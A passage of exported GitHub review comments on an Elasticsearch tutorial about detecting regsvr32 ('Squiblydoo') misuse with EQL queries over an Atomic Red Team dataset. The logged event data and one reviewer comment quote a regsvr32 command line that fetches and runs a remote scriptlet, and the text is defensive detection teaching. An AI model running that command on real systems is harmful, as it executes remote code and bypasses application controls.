behavior.\n+\n+In the scenario, you're tasked with detecting\n+https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] in Windows event\n+logs ingested using {winlogbeat-ref}/index.html[Winlogbeat]. Regsvr32 misuse is\n+a known adversary technique documented in the https://attack.mitre.org[MITRE\n+ATT&CK\u00ae] knowledge base.\n+\n+[discrete]\n+[[eql-ex-threat-detection-setup]]\n+=== Setup\n+\n+This tutorial uses a test dataset for regsvr32 misuse from\n+https://github.com/redcanaryco/atomic-red-team[Atomic Red Team]. The dataset has\n+been normalized and mapped to the {ecs-ref}[Elastic Common Schema (ECS)]. The\n+dataset includes events that imitate behaviors related to regsvr32 misuse, as\n+documented by MITRE ATT&CK\u00ae.\n+\n+To get started, download and index the dataset:\n+\n+. Download the https://raw.githubusercontent.com/elastic/elasticsearch/{branch}/docs/src/test/resources/normalized-T1117-AtomicRed-regsvr32.json[`normalized-T1117-AtomicRed-regsvr32.json`] dataset.\n+\n+. Index the data into the `my-index-000001` index with the following\n+<<docs-bulk,bulk API>> request:\n++\n+[source,sh]\n+----\n+curl -H \"Content-Type: application/json\" -XPOST \"localhost:9200/my-index-000001/_bulk?pretty&refresh\" --data-binary \"@normalized-T1117-AtomicRed-regsvr32.json\"\n+----\n+// NOTCONSOLE\n+\n+. Use the <<cat-indices,cat indices API>> to verify the dataset was indexed\n+successfully.\n++\n+[source,console]\n+----\n+GET /_cat/indices/my-index-000001?v&h=health,status,index,docs.count\n+----\n+// TEST[setup:atomic_red_regsvr32]\n++\n+The API returns the following response. The `docs.count` value should show `150`\n+documents were indexed.\n++\n+[source,txt]\n+----\n+health status index            docs.count\n+yellow open   my-index-000001         150\n+----\n+// TESTRESPONSE[non_json]\n+\n+[discrete]\n+[[eql-ex-get-a-count-of-regsvr32-events]]\n+=== Get a count of `regsvr32.exe` events\n+\n+Since you're looking for `regsvr32` misuse, start by getting a count of events\n+using `regsvr32.exe`.\n+\n+The following <<eql-search-api,EQL search API>> request uses an EQL query to\n+retrieve a count of events with a `process.name` of `regsvr32.exe`. The query\n+starts with the <<eql-syntax-match-any-event-category,`any where` keywords>>,\n+meaning the query can match events of any <<eql-required-fields,event\n+category>>.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search?filter_path=-hits.events  <1>\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\"        <2>\n+  \"\"\",\n+  \"size\": 150                                       <3>\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+<1> Uses the `?filter_path=-hits.events` query parameter to exclude the\n+`hits.events` property from the response. The `hits.events` property contains\n+the document source for any matching events. This request is intended to\n+retrieve a count of events only.\n+<2> Uses an EQL query to match events with a `process.name` of `regsvr32.exe`.\n+<3> Returns up to 150 events or sequences matching the EQL query.\n+\n+The request returns the following response, indicating that 143 events match the\n+query.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 60,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 143,\n+      \"relation\": \"eq\"\n+    }\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 60/\"took\": $body.took/]\n+\n+[discrete]\n+[[eql-ex-check-for-command-line-artifacts]]\n+=== Check for command line artifacts\n+\n+Your previous query matched 143 events. Many of these events are likely to be\n+false positives.", "originalCommit": "f31c960703c14de408a11b972445c80b1309683d", "replyToReviewId": null, "replies": null, "type": "inlineReview"}, {"id": "MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDQ3MDYyMDUxNQ==", "url": "https://github.com/elastic/elasticsearch/pull/59105#discussion_r470620515", "bodyText": "This specific variant is called \"Squibblydoo.\" You don't have to include that name, but another pointer back to https://attack.mitre.org/techniques/T1218/010/ could be good here, if you want to \"read on for more information\"  about how this works.", "author": "rw-access", "createdAt": "2020-08-14T13:23:25Z", "path": "docs/reference/eql/detect-threats-with-eql.asciidoc", "diffHunk": "@@ -0,0 +1,424 @@\n+[role=\"xpack\"]\n+[testenv=\"basic\"]\n+[[eql-ex-threat-detection]]\n+== Example: Detect threats with EQL\n+\n+experimental::[]\n+\n+This example tutorial shows you how you can use EQL to detect security threats\n+and other suspicious behavior.\n+\n+In the scenario, you're tasked with detecting\n+https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] in Windows event\n+logs ingested using {winlogbeat-ref}/index.html[Winlogbeat]. Regsvr32 misuse is\n+a known adversary technique documented in the https://attack.mitre.org[MITRE\n+ATT&CK\u00ae] knowledge base.\n+\n+[discrete]\n+[[eql-ex-threat-detection-setup]]\n+=== Setup\n+\n+This tutorial uses a test dataset for regsvr32 misuse from\n+https://github.com/redcanaryco/atomic-red-team[Atomic Red Team]. The dataset has\n+been normalized and mapped to the {ecs-ref}[Elastic Common Schema (ECS)]. The\n+dataset includes events that imitate behaviors related to regsvr32 misuse, as\n+documented by MITRE ATT&CK\u00ae.\n+\n+To get started, download and index the dataset:\n+\n+. Download the https://raw.githubusercontent.com/elastic/elasticsearch/{branch}/docs/src/test/resources/normalized-T1117-AtomicRed-regsvr32.json[`normalized-T1117-AtomicRed-regsvr32.json`] dataset.\n+\n+. Index the data into the `my-index-000001` index with the following\n+<<docs-bulk,bulk API>> request:\n++\n+[source,sh]\n+----\n+curl -H \"Content-Type: application/json\" -XPOST \"localhost:9200/my-index-000001/_bulk?pretty&refresh\" --data-binary \"@normalized-T1117-AtomicRed-regsvr32.json\"\n+----\n+// NOTCONSOLE\n+\n+. Use the <<cat-indices,cat indices API>> to verify the dataset was indexed\n+successfully.\n++\n+[source,console]\n+----\n+GET /_cat/indices/my-index-000001?v&h=health,status,index,docs.count\n+----\n+// TEST[setup:atomic_red_regsvr32]\n++\n+The API returns the following response. The `docs.count` value should show `150`\n+documents were indexed.\n++\n+[source,txt]\n+----\n+health status index            docs.count\n+yellow open   my-index-000001         150\n+----\n+// TESTRESPONSE[non_json]\n+\n+[discrete]\n+[[eql-ex-get-a-count-of-regsvr32-events]]\n+=== Get a count of `regsvr32.exe` events\n+\n+Since you're looking for `regsvr32` misuse, start by getting a count of events\n+using `regsvr32.exe`.\n+\n+The following <<eql-search-api,EQL search API>> request uses an EQL query to\n+retrieve a count of events with a `process.name` of `regsvr32.exe`. The query\n+starts with the <<eql-syntax-match-any-event-category,`any where` keywords>>,\n+meaning the query can match events of any <<eql-required-fields,event\n+category>>.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search?filter_path=-hits.events  <1>\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\"        <2>\n+  \"\"\",\n+  \"size\": 150                                       <3>\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+<1> Uses the `?filter_path=-hits.events` query parameter to exclude the\n+`hits.events` property from the response. The `hits.events` property contains\n+the document source for any matching events. This request is intended to\n+retrieve a count of events only.\n+<2> Uses an EQL query to match events with a `process.name` of `regsvr32.exe`.\n+<3> Returns up to 150 events or sequences matching the EQL query.\n+\n+The request returns the following response, indicating that 143 events match the\n+query.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 60,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 143,\n+      \"relation\": \"eq\"\n+    }\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 60/\"took\": $body.took/]\n+\n+[discrete]\n+[[eql-ex-check-for-command-line-artifacts]]\n+=== Check for command line artifacts\n+\n+Your previous query matched 143 events. Many of these events are likely to be\n+false positives.\n+\n+To narrow down the results, check if the command line was used during any of\n+these events. Append `and process.command_line > 0` to the previous EQL query.\n+This limits matching results to events that contain a `process.command_line`\n+value.\n+\n+You'll also need to remove the `filter_path=-hits.events` query parameter. This\n+lets you retrieve the document source for any matching events.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\" and process.command_line > 0\n+  \"\"\",\n+  \"size\": 150\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+The query matches one event. Based on the event's `process.command_line` value,\n+`regsvr32.exe` was used to register a script as `scrobj.dll`. This fits known\n+regsvr32 misuse behavior.", "originalCommit": "f31c960703c14de408a11b972445c80b1309683d", "replyToReviewId": null, "replies": null, "type": "inlineReview"}, {"id": "MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDQ3MDYyMTI1MA==", "url": "https://github.com/elastic/elasticsearch/pull/59105#discussion_r470621250", "bodyText": "I'll have to have another look at this dataset. I think that event is mapped as file when it should be library. I'll see if I can update it for you, and come back to this example.", "author": "rw-access", "createdAt": "2020-08-14T13:24:46Z", "path": "docs/reference/eql/detect-threats-with-eql.asciidoc", "diffHunk": "@@ -0,0 +1,424 @@\n+[role=\"xpack\"]\n+[testenv=\"basic\"]\n+[[eql-ex-threat-detection]]\n+== Example: Detect threats with EQL\n+\n+experimental::[]\n+\n+This example tutorial shows you how you can use EQL to detect security threats\n+and other suspicious behavior.\n+\n+In the scenario, you're tasked with detecting\n+https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] in Windows event\n+logs ingested using {winlogbeat-ref}/index.html[Winlogbeat]. Regsvr32 misuse is\n+a known adversary technique documented in the https://attack.mitre.org[MITRE\n+ATT&CK\u00ae] knowledge base.\n+\n+[discrete]\n+[[eql-ex-threat-detection-setup]]\n+=== Setup\n+\n+This tutorial uses a test dataset for regsvr32 misuse from\n+https://github.com/redcanaryco/atomic-red-team[Atomic Red Team]. The dataset has\n+been normalized and mapped to the {ecs-ref}[Elastic Common Schema (ECS)]. The\n+dataset includes events that imitate behaviors related to regsvr32 misuse, as\n+documented by MITRE ATT&CK\u00ae.\n+\n+To get started, download and index the dataset:\n+\n+. Download the https://raw.githubusercontent.com/elastic/elasticsearch/{branch}/docs/src/test/resources/normalized-T1117-AtomicRed-regsvr32.json[`normalized-T1117-AtomicRed-regsvr32.json`] dataset.\n+\n+. Index the data into the `my-index-000001` index with the following\n+<<docs-bulk,bulk API>> request:\n++\n+[source,sh]\n+----\n+curl -H \"Content-Type: application/json\" -XPOST \"localhost:9200/my-index-000001/_bulk?pretty&refresh\" --data-binary \"@normalized-T1117-AtomicRed-regsvr32.json\"\n+----\n+// NOTCONSOLE\n+\n+. Use the <<cat-indices,cat indices API>> to verify the dataset was indexed\n+successfully.\n++\n+[source,console]\n+----\n+GET /_cat/indices/my-index-000001?v&h=health,status,index,docs.count\n+----\n+// TEST[setup:atomic_red_regsvr32]\n++\n+The API returns the following response. The `docs.count` value should show `150`\n+documents were indexed.\n++\n+[source,txt]\n+----\n+health status index            docs.count\n+yellow open   my-index-000001         150\n+----\n+// TESTRESPONSE[non_json]\n+\n+[discrete]\n+[[eql-ex-get-a-count-of-regsvr32-events]]\n+=== Get a count of `regsvr32.exe` events\n+\n+Since you're looking for `regsvr32` misuse, start by getting a count of events\n+using `regsvr32.exe`.\n+\n+The following <<eql-search-api,EQL search API>> request uses an EQL query to\n+retrieve a count of events with a `process.name` of `regsvr32.exe`. The query\n+starts with the <<eql-syntax-match-any-event-category,`any where` keywords>>,\n+meaning the query can match events of any <<eql-required-fields,event\n+category>>.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search?filter_path=-hits.events  <1>\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\"        <2>\n+  \"\"\",\n+  \"size\": 150                                       <3>\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+<1> Uses the `?filter_path=-hits.events` query parameter to exclude the\n+`hits.events` property from the response. The `hits.events` property contains\n+the document source for any matching events. This request is intended to\n+retrieve a count of events only.\n+<2> Uses an EQL query to match events with a `process.name` of `regsvr32.exe`.\n+<3> Returns up to 150 events or sequences matching the EQL query.\n+\n+The request returns the following response, indicating that 143 events match the\n+query.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 60,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 143,\n+      \"relation\": \"eq\"\n+    }\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 60/\"took\": $body.took/]\n+\n+[discrete]\n+[[eql-ex-check-for-command-line-artifacts]]\n+=== Check for command line artifacts\n+\n+Your previous query matched 143 events. Many of these events are likely to be\n+false positives.\n+\n+To narrow down the results, check if the command line was used during any of\n+these events. Append `and process.command_line > 0` to the previous EQL query.\n+This limits matching results to events that contain a `process.command_line`\n+value.\n+\n+You'll also need to remove the `filter_path=-hits.events` query parameter. This\n+lets you retrieve the document source for any matching events.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\" and process.command_line > 0\n+  \"\"\",\n+  \"size\": 150\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+The query matches one event. Based on the event's `process.command_line` value,\n+`regsvr32.exe` was used to register a script as `scrobj.dll`. This fits known\n+regsvr32 misuse behavior.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 21,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 1,\n+      \"relation\": \"eq\"\n+    },\n+    \"events\": [\n+      {\n+        \"_index\": \"my-index-000001\",\n+        \"_id\": \"gl5MJXMBMk1dGnErnBW8\",\n+        \"_score\": null,\n+        \"_source\": {\n+          \"process\": {\n+            \"parent\": {\n+              \"name\": \"cmd.exe\",\n+              \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010AA385401}\",\n+              \"executable\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\"\n+            },\n+            \"name\": \"regsvr32.exe\",\n+            \"pid\": 2012,\n+            \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010A0395401}\",\n+            \"command_line\": \"regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll\",\n+            \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\",\n+            \"ppid\": 2652\n+          },\n+          \"logon_id\": 217055,\n+          \"@timestamp\": 131883573237130000,\n+          \"event\": {\n+            \"category\": \"process\",\n+            \"type\": \"creation\"\n+          },\n+          \"user\": {\n+            \"full_name\": \"bob\",\n+            \"domain\": \"ART-DESKTOP\",\n+            \"id\": \"ART-DESKTOP\\\\bob\"\n+          }\n+        }\n+      }\n+    ]\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 21/\"took\": $body.took/]\n+// TESTRESPONSE[s/\"_id\": \"gl5MJXMBMk1dGnErnBW8\"/\"_id\": $body.hits.events.0._id/]\n+\n+[discrete]\n+[[eql-ex-check-for-malicious-script-loads]]\n+=== Check for malicious script loads\n+\n+You now know that `regsvr32.exe` was used to register\n+a potentially malicious script as `scrob.dll`. Next, find any processes that\n+later load the `scrob.dll` file.\n+\n+Modify the previous EQL query as follows:\n+\n+* Change the `any` keyword to `file`. This means the query only matches", "originalCommit": "f31c960703c14de408a11b972445c80b1309683d", "replyToReviewId": null, "replies": null, "type": "inlineReview"}, {"id": "MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDQ3MDYyMjk4OA==", "url": "https://github.com/elastic/elasticsearch/pull/59105#discussion_r470622988", "bodyText": "Could add a note that based off the command line we saw earlier (regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll) that we expect to find a match.\nOne reason why you might want to write a sequence here, is that it allows you to write the detection more generically and you don't have to overfit to the command line. The sequence looks for all the things that are suspicious, but they're also generic, so you're more likely to detect future variants as well.", "author": "rw-access", "createdAt": "2020-08-14T13:27:55Z", "path": "docs/reference/eql/detect-threats-with-eql.asciidoc", "diffHunk": "@@ -0,0 +1,424 @@\n+[role=\"xpack\"]\n+[testenv=\"basic\"]\n+[[eql-ex-threat-detection]]\n+== Example: Detect threats with EQL\n+\n+experimental::[]\n+\n+This example tutorial shows you how you can use EQL to detect security threats\n+and other suspicious behavior.\n+\n+In the scenario, you're tasked with detecting\n+https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] in Windows event\n+logs ingested using {winlogbeat-ref}/index.html[Winlogbeat]. Regsvr32 misuse is\n+a known adversary technique documented in the https://attack.mitre.org[MITRE\n+ATT&CK\u00ae] knowledge base.\n+\n+[discrete]\n+[[eql-ex-threat-detection-setup]]\n+=== Setup\n+\n+This tutorial uses a test dataset for regsvr32 misuse from\n+https://github.com/redcanaryco/atomic-red-team[Atomic Red Team]. The dataset has\n+been normalized and mapped to the {ecs-ref}[Elastic Common Schema (ECS)]. The\n+dataset includes events that imitate behaviors related to regsvr32 misuse, as\n+documented by MITRE ATT&CK\u00ae.\n+\n+To get started, download and index the dataset:\n+\n+. Download the https://raw.githubusercontent.com/elastic/elasticsearch/{branch}/docs/src/test/resources/normalized-T1117-AtomicRed-regsvr32.json[`normalized-T1117-AtomicRed-regsvr32.json`] dataset.\n+\n+. Index the data into the `my-index-000001` index with the following\n+<<docs-bulk,bulk API>> request:\n++\n+[source,sh]\n+----\n+curl -H \"Content-Type: application/json\" -XPOST \"localhost:9200/my-index-000001/_bulk?pretty&refresh\" --data-binary \"@normalized-T1117-AtomicRed-regsvr32.json\"\n+----\n+// NOTCONSOLE\n+\n+. Use the <<cat-indices,cat indices API>> to verify the dataset was indexed\n+successfully.\n++\n+[source,console]\n+----\n+GET /_cat/indices/my-index-000001?v&h=health,status,index,docs.count\n+----\n+// TEST[setup:atomic_red_regsvr32]\n++\n+The API returns the following response. The `docs.count` value should show `150`\n+documents were indexed.\n++\n+[source,txt]\n+----\n+health status index            docs.count\n+yellow open   my-index-000001         150\n+----\n+// TESTRESPONSE[non_json]\n+\n+[discrete]\n+[[eql-ex-get-a-count-of-regsvr32-events]]\n+=== Get a count of `regsvr32.exe` events\n+\n+Since you're looking for `regsvr32` misuse, start by getting a count of events\n+using `regsvr32.exe`.\n+\n+The following <<eql-search-api,EQL search API>> request uses an EQL query to\n+retrieve a count of events with a `process.name` of `regsvr32.exe`. The query\n+starts with the <<eql-syntax-match-any-event-category,`any where` keywords>>,\n+meaning the query can match events of any <<eql-required-fields,event\n+category>>.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search?filter_path=-hits.events  <1>\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\"        <2>\n+  \"\"\",\n+  \"size\": 150                                       <3>\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+<1> Uses the `?filter_path=-hits.events` query parameter to exclude the\n+`hits.events` property from the response. The `hits.events` property contains\n+the document source for any matching events. This request is intended to\n+retrieve a count of events only.\n+<2> Uses an EQL query to match events with a `process.name` of `regsvr32.exe`.\n+<3> Returns up to 150 events or sequences matching the EQL query.\n+\n+The request returns the following response, indicating that 143 events match the\n+query.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 60,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 143,\n+      \"relation\": \"eq\"\n+    }\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 60/\"took\": $body.took/]\n+\n+[discrete]\n+[[eql-ex-check-for-command-line-artifacts]]\n+=== Check for command line artifacts\n+\n+Your previous query matched 143 events. Many of these events are likely to be\n+false positives.\n+\n+To narrow down the results, check if the command line was used during any of\n+these events. Append `and process.command_line > 0` to the previous EQL query.\n+This limits matching results to events that contain a `process.command_line`\n+value.\n+\n+You'll also need to remove the `filter_path=-hits.events` query parameter. This\n+lets you retrieve the document source for any matching events.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\" and process.command_line > 0\n+  \"\"\",\n+  \"size\": 150\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+The query matches one event. Based on the event's `process.command_line` value,\n+`regsvr32.exe` was used to register a script as `scrobj.dll`. This fits known\n+regsvr32 misuse behavior.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 21,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 1,\n+      \"relation\": \"eq\"\n+    },\n+    \"events\": [\n+      {\n+        \"_index\": \"my-index-000001\",\n+        \"_id\": \"gl5MJXMBMk1dGnErnBW8\",\n+        \"_score\": null,\n+        \"_source\": {\n+          \"process\": {\n+            \"parent\": {\n+              \"name\": \"cmd.exe\",\n+              \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010AA385401}\",\n+              \"executable\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\"\n+            },\n+            \"name\": \"regsvr32.exe\",\n+            \"pid\": 2012,\n+            \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010A0395401}\",\n+            \"command_line\": \"regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll\",\n+            \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\",\n+            \"ppid\": 2652\n+          },\n+          \"logon_id\": 217055,\n+          \"@timestamp\": 131883573237130000,\n+          \"event\": {\n+            \"category\": \"process\",\n+            \"type\": \"creation\"\n+          },\n+          \"user\": {\n+            \"full_name\": \"bob\",\n+            \"domain\": \"ART-DESKTOP\",\n+            \"id\": \"ART-DESKTOP\\\\bob\"\n+          }\n+        }\n+      }\n+    ]\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 21/\"took\": $body.took/]\n+// TESTRESPONSE[s/\"_id\": \"gl5MJXMBMk1dGnErnBW8\"/\"_id\": $body.hits.events.0._id/]\n+\n+[discrete]\n+[[eql-ex-check-for-malicious-script-loads]]\n+=== Check for malicious script loads\n+\n+You now know that `regsvr32.exe` was used to register\n+a potentially malicious script as `scrob.dll`. Next, find any processes that\n+later load the `scrob.dll` file.\n+\n+Modify the previous EQL query as follows:\n+\n+* Change the `any` keyword to `file`. This means the query only matches\n+events with an `event.category` of `file`.\n+* Add the `file.name == \"scrobj.dll` condition to check for loads of\n+the `scrobj.dll` file.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search\n+{\n+  \"query\": \"\"\"\n+    file where process.name == \"regsvr32.exe\" and file.name == \"scrobj.dll\"\n+  \"\"\",\n+  \"size\": 150\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+The query matches an event, confirming that `scrobj.dll` was later loaded by\n+`regsvr32.exe`.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 5,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 1,\n+      \"relation\": \"eq\"\n+    },\n+    \"events\": [\n+      {\n+        \"_index\": \"my-index-000001\",\n+        \"_id\": \"ol5MJXMBMk1dGnErnBW8\",\n+        \"_score\": null,\n+        \"_source\": {\n+          \"process\": {\n+            \"name\": \"regsvr32.exe\",\n+            \"pid\": 2012,\n+            \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010A0395401}\",\n+            \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\"\n+          },\n+          \"file\": {\n+            \"path\": \"C:\\\\Windows\\\\System32\\\\scrobj.dll\",\n+            \"name\": \"scrobj.dll\"\n+          },\n+          \"@timestamp\": 131883573237450016,\n+          \"event\": {\n+            \"category\": \"file\"\n+          }\n+        }\n+      }\n+    ]\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 5/\"took\": $body.took/]\n+// TESTRESPONSE[s/\"_id\": \"ol5MJXMBMk1dGnErnBW8\"/\"_id\": $body.hits.events.0._id/]\n+\n+[discrete]\n+[[eql-ex-detemine-likelihood-of-sucess]]\n+=== Determine likelihood of success\n+\n+In many cases, malicious scripts are used to download other remote files. If\n+this occurred, the attack progressed and might have succeeded.\n+\n+Use an <<eql-sequences,EQL sequence query>> to check for the following series of", "originalCommit": "f31c960703c14de408a11b972445c80b1309683d", "replyToReviewId": null, "replies": null, "type": "inlineReview"}, {"id": "MDI0OlB1bGxSZXF1ZXN0UmV2aWV3Q29tbWVudDQ3MDYyMzM4OQ==", "url": "https://github.com/elastic/elasticsearch/pull/59105#discussion_r470623389", "bodyText": "Change to however you want to communicate this\n\n  \n    \n      \n        Suggested change\n        \n          \n    \n\n        \n      \n    \n    \n      \n          \n            \n            . A `regsvr32.exe` process, which could have been used to register malicious\n          \n          \n            \n            scripts as `scrobj.dll`\n          \n          \n            \n            . A load of the `scrobj.dll` file\n          \n          \n            \n            . Any network event, which could indicate the download of a remote file\n          \n          \n            \n            . A `regsvr32.exe` process, which could have been used to register malicious\n          \n          \n            \n            scripts as `scrobj.dll`\n          \n          \n            \n            . A load of the `scrobj.dll` file by that same process\n          \n          \n            \n            . Any network event by that same process, which could indicate the download of a remote file", "author": "rw-access", "createdAt": "2020-08-14T13:28:47Z", "path": "docs/reference/eql/detect-threats-with-eql.asciidoc", "diffHunk": "@@ -0,0 +1,424 @@\n+[role=\"xpack\"]\n+[testenv=\"basic\"]\n+[[eql-ex-threat-detection]]\n+== Example: Detect threats with EQL\n+\n+experimental::[]\n+\n+This example tutorial shows you how you can use EQL to detect security threats\n+and other suspicious behavior.\n+\n+In the scenario, you're tasked with detecting\n+https://attack.mitre.org/techniques/T1117/[regsvr32 misuse] in Windows event\n+logs ingested using {winlogbeat-ref}/index.html[Winlogbeat]. Regsvr32 misuse is\n+a known adversary technique documented in the https://attack.mitre.org[MITRE\n+ATT&CK\u00ae] knowledge base.\n+\n+[discrete]\n+[[eql-ex-threat-detection-setup]]\n+=== Setup\n+\n+This tutorial uses a test dataset for regsvr32 misuse from\n+https://github.com/redcanaryco/atomic-red-team[Atomic Red Team]. The dataset has\n+been normalized and mapped to the {ecs-ref}[Elastic Common Schema (ECS)]. The\n+dataset includes events that imitate behaviors related to regsvr32 misuse, as\n+documented by MITRE ATT&CK\u00ae.\n+\n+To get started, download and index the dataset:\n+\n+. Download the https://raw.githubusercontent.com/elastic/elasticsearch/{branch}/docs/src/test/resources/normalized-T1117-AtomicRed-regsvr32.json[`normalized-T1117-AtomicRed-regsvr32.json`] dataset.\n+\n+. Index the data into the `my-index-000001` index with the following\n+<<docs-bulk,bulk API>> request:\n++\n+[source,sh]\n+----\n+curl -H \"Content-Type: application/json\" -XPOST \"localhost:9200/my-index-000001/_bulk?pretty&refresh\" --data-binary \"@normalized-T1117-AtomicRed-regsvr32.json\"\n+----\n+// NOTCONSOLE\n+\n+. Use the <<cat-indices,cat indices API>> to verify the dataset was indexed\n+successfully.\n++\n+[source,console]\n+----\n+GET /_cat/indices/my-index-000001?v&h=health,status,index,docs.count\n+----\n+// TEST[setup:atomic_red_regsvr32]\n++\n+The API returns the following response. The `docs.count` value should show `150`\n+documents were indexed.\n++\n+[source,txt]\n+----\n+health status index            docs.count\n+yellow open   my-index-000001         150\n+----\n+// TESTRESPONSE[non_json]\n+\n+[discrete]\n+[[eql-ex-get-a-count-of-regsvr32-events]]\n+=== Get a count of `regsvr32.exe` events\n+\n+Since you're looking for `regsvr32` misuse, start by getting a count of events\n+using `regsvr32.exe`.\n+\n+The following <<eql-search-api,EQL search API>> request uses an EQL query to\n+retrieve a count of events with a `process.name` of `regsvr32.exe`. The query\n+starts with the <<eql-syntax-match-any-event-category,`any where` keywords>>,\n+meaning the query can match events of any <<eql-required-fields,event\n+category>>.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search?filter_path=-hits.events  <1>\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\"        <2>\n+  \"\"\",\n+  \"size\": 150                                       <3>\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+<1> Uses the `?filter_path=-hits.events` query parameter to exclude the\n+`hits.events` property from the response. The `hits.events` property contains\n+the document source for any matching events. This request is intended to\n+retrieve a count of events only.\n+<2> Uses an EQL query to match events with a `process.name` of `regsvr32.exe`.\n+<3> Returns up to 150 events or sequences matching the EQL query.\n+\n+The request returns the following response, indicating that 143 events match the\n+query.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 60,\n+  \"timed_out\": false,\n+  \"hits\": {\n+    \"total\": {\n+      \"value\": 143,\n+      \"relation\": \"eq\"\n+    }\n+  }\n+}\n+----\n+// TESTRESPONSE[s/\"took\": 60/\"took\": $body.took/]\n+\n+[discrete]\n+[[eql-ex-check-for-command-line-artifacts]]\n+=== Check for command line artifacts\n+\n+Your previous query matched 143 events. Many of these events are likely to be\n+false positives.\n+\n+To narrow down the results, check if the command line was used during any of\n+these events. Append `and process.command_line > 0` to the previous EQL query.\n+This limits matching results to events that contain a `process.command_line`\n+value.\n+\n+You'll also need to remove the `filter_path=-hits.events` query parameter. This\n+lets you retrieve the document source for any matching events.\n+\n+[source,console]\n+----\n+GET /my-index-000001/_eql/search\n+{\n+  \"query\": \"\"\"\n+    any where process.name == \"regsvr32.exe\" and process.command_line > 0\n+  \"\"\",\n+  \"size\": 150\n+}\n+----\n+// TEST[setup:atomic_red_regsvr32]\n+\n+The query matches one event. Based on the event's `process.command_line` value,\n+`regsvr32.exe` was used to register a script as `scrobj.dll`. This fits known\n+regsvr32 misuse behavior.\n+\n+[source,console-result]\n+----\n+{\n+  \"is_partial\": false,\n+  \"is_running\": false,\n+  \"took\": 